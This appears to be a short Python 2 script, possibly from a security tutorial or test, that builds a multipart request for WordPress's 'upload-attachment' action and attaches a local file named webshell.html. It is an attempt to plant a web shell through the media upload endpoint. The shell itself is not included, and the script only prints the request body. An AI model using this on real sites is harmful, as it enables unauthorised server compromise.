import os, stat, mimetypes, httplib
import urllib, urllib2
from cookielib import CookieJar
import time


def encode_multipart_formdata(fields, files):                                                     #(1)
    BOUNDARY = "--pluploadboundary%s" % (int)(time.time())                                        #(2)
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:                                                                   #(3)
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, fd) in files:                                                                       #(4)
        file_size = os.fstat(fd.fileno())[stat.ST_SIZE]
        filename = fd.name.split('/')[-1]
        contenttype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        L.append('--%s' % BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: %s' % contenttype)
        fd.seek(0)
        L.append('\r\n' + fd.read())
    L.append('--' + BOUNDARY + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
    return content_type, body



fields =  [                                                                                       #(5)
    ("post_id", "59"),
    ("_wpnonce", "7716717b8c"),
    ("action", "upload-attachment"),
    ("name", "webshell.html"),
           ]
# various types file test
fd = open("webshell.html", "rb")                                                                  #(6)
files = [("async-upload", fd)]

content_type, body = encode_multipart_formdata(fields, files)                                     #(7)

print body
